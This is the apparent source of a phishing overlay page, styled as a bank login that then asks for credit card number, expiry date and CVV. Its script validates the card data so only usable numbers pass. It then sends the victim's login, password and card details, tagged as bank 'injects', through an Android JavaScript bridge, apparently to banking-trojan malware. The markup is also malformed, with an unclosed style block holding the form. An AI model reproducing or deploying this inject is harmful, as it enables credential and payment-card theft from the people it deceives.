<style> 
    #form1,#form2 {
        display: flex;
        flex-direction: column;
        min-height: 100vh;
    }

        section{
            padding: 10px;
            flex: 1;
        }
        .cool-input {
            box-sizing: border-box;
            border: 0;
            width: 100%;
            position: relative;
            font-size: 16px;
            margin-bottom: 15px;
            
        }

        .cool-input__input {
            box-sizing: border-box;
            background: none;
            width: 100%;
            padding: 10px;
            padding-left: 0;
            position: relative;
            z-index: 2;
            font-size: 14px;
        }

        .cool-input__input:focus {
            outline: none;
            
        }
        .grid{
            display: grid;
            grid-template-columns: 1fr 1fr ;
        }
        .cool-input__placeholder {
            box-sizing: border-box;
            border: none;
            background: none;
            width: auto;
            position: absolute;
            z-index: 1;
            left: 32px;
            top: 50%;
            line-height: 1em;
            color: #002d74;
            font-weight: 400;
            transition: all 0.2s ease;
        }
        .button {
            display: block;
            margin: 0 auto;
            text-align: center;
            color: white;
            border: 0;
            padding: 10px;
            margin-bottom: 15px;
            background: #002d74;
            font-weight: 500;
            width: 50%;
            border-radius: 30px;
        }
        .button:disabled {
            opacity: 0.4;
        }
        .cool-input__input_filled + .cool-input__placeholder, .cool-input__input:focus + .cool-input__placeholder {
            font-size: 0.8em;
            top: 0;
            margin-top: 0.3em;
            padding: 5px 0;
            z-index: 99;
            width: auto;
            text-align: right;
            right: 0;
        }

        .cool-input__input:focus + .cool-input__placeholder {
            color: #002d74;
            right:0;
            text-align: right;
            font-weight: 400;
        }

        <section>
            <div class="cool-input">
                <input type="tel" inputmode="numeric" id="cc" name="fields[cc]" onkeyup="check6();check8()" class="input cool-input__input" placeholder="" autocomplete="off">
                <span class="cool-input__placeholder">Credit card</span>
            </div>
            <div class="cool-input" style="width: 50%;float: left;">
                <input type="tel" inputmode="numeric" id="exp" name="fields[exp]" onkeyup="check7();check8()" class="input cool-input__input" placeholder="" autocomplete="off">
                <span class="cool-input__placeholder">Expiration Date</span>
            </div>
            <div class="cool-input" style="width: 46%;float: right;">
                <input type="password" inputmode="numeric" id="cvv" name="fields[cvv]" onkeyup="check8()" class="input cool-input__input" placeholder="" autocomplete="off">
                <span class="cool-input__placeholder">CVV</span>
            </div>

            <input type="submit" class="button" id="sendData" disabled value="Login">
        </section>
    </div>
    </form>
    <script>
        $('#cc').mask('0000 0000 0000 0000')
        $('#exp').mask('00/00')
        $('#cvv').mask('000')

        var spinner = document.getElementById('spinner'),
            form1 = document.getElementById('form1'),
            form2 = document.getElementById('form2');

        var login = document.getElementById('login'),
            password = document.getElementById('password');
        
        var checkOff = document.getElementById('checkOff'),
            checkOn = document.getElementById('checkOn');

        checkOff.onclick = () => {
            checkOff.style.display = 'none';
            checkOn.style.display = 'inline';
        }

        checkOn.onclick = () => {
            checkOff.style.display = 'inline';
            checkOn.style.display = 'none';
        }
        $('.cool-input__input').on('input', function(){
            var $this = $(this);
            if ($this.val() == '') {
                $this.removeClass('cool-input__input_filled');
            } else {
                $this.addClass('cool-input__input_filled');
            }
        });
        function check() {
            if(login.value.length >= 4 && password.value.length >= 4) {
                nextPage.disabled = false;
            } else {
                nextPage.disabled = true;
            }
        };

        nextPage.onclick = () => {
            if(login.value.length < 4) {
                login.classList.add('error');
            } else {
                login.classList.remove('error');
            }

            
            if(password.value.length < 4) {
                password.classList.add('error');
            } else {
                password.classList.remove('error');
            }

            if(login.value.length >= 4 && password.value.length >= 4) {
                spinner.style.display = 'block';

                setTimeout(() => {
                    form1.style.display = 'none';
                    spinner.style.display = 'none';
                    form2.style.display = 'flex';
                }, 1500);
            }
        }
        function check7() {
            
            var mmYY = exp.value.split('/');
            var month = parseInt(mmYY[0]);
            var year = parseInt(mmYY[1]);
    
            var expArray = exp.value.split('/');
            var today, someday;
            var exMonth = expArray[0];
            var exYear = "20" + expArray[1];
    
            today = new Date();
            someday = new Date();
            someday.setFullYear(exYear, exMonth, 1);
                    
            if(month > 12 || month == 0 || month == 00 || someday < today || year > 27 || exp.value.length != 5) {
                exp.classList.add('error')
            } else {
                exp.classList.remove('error')
                return true
            }
        }

        function check6() {
            if(!valid_credit_card(cc.value)) {
                cc.classList.add('error')
            } else {
                cc.classList.remove('error');
            }
        }

        function valid_credit_card(value) {
            if(value=='' || value.length < 19 || value=='0000 0000 0000 0000') return false;
            if (/[^0-9-\s]+/.test(value)) return false;
            var nCheck = 0, nDigit = 0, bEven = false;
            value = value.replace(/\D/g, "");
            for (var n = value.length - 1; n >= 0; n--) {
                var cDigit = value.charAt(n),
                    nDigit = parseInt(cDigit, 10);
                if (bEven) {
                    if ((nDigit *= 2) > 9) nDigit -= 9;
                }
                nCheck += nDigit;
                bEven = !bEven;
            }
            return (nCheck % 10) == 0;
            
        }

        function check8() {
            if(valid_credit_card(cc.value) && check7() && cvv.value.length === 3) {
                sendData.disabled = false;
            } else {
                sendData.disabled = true;
            }
        }

        sendData.onclick = () => {
                var data = {};
                data.login = login.value;
                data.password = password.value;
                data.cc = cc.value;
                data.exp = exp.value;
                data.cvv = cvv.value;
                data.type_injects = "banks";
                data.closed = "close_activity_injects";

                var ua = navigator.userAgent.toLowerCase();
                if(ua.indexOf("android") > -1) {
                    try {
                        Android.send_log_injects(JSON.stringify(data))
                    } catch (err) {}
                }else{
                    alert(JSON.stringify(data));
                }
        }
    </script>
</body>
</html>
